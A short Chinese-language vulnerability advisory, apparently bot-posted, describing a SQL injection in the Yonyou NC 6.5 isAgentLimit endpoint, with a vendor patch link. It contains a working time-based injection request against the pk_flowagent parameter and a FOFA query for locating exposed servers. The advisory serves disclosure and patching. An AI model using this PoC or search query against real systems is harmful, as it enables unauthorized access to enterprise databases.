#  用友NC6.5版本oacoSchedulerEvents接口存在sql注入漏洞   
原创 漏洞预警机器人  安全光圈   2024-06-12 17:38  
  
# 用友NC6.5版本oacoSchedulerEvents接口存在sql注入漏洞  
  
免责声明：本文内容为机器人搜集最新漏洞及POC分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！  
## 漏洞名称  
  
用友NC6.5版本oacoSchedulerEvents接口sql注入漏洞  
## 漏洞描述  
  
用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。用友NC存在SQL注入漏洞，该漏洞源于/portal/pt/oacoSchedulerEvents/isAgentLimit接口中的pk_flowagent参数存在sql注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。  
  
影响范围：用友网络科技股份有限公司-NC6.5受影响。NCM_NC6.5_000_109902_20240607_GP_741839402不受影响。  
## FOFA语句  
```
app="用友-UFIDA-NC"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g1X9cMsc6D1qtmjicu41MBx5afymlZMMhoOlmQCibPic8P2rJ61MMVia5UKRO7q1ffQg6hdQph67CprrVNHI9p1pog/640?wx_fmt=png&from=appmsg "null")  
## POC  
```
GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5
```  
## 补丁  
  
用友安全中心已发布漏洞公告，请尽快前往下载更新补丁：  
  
https://security.yonyou.com/#/noticeInfo?id=560  
  
  
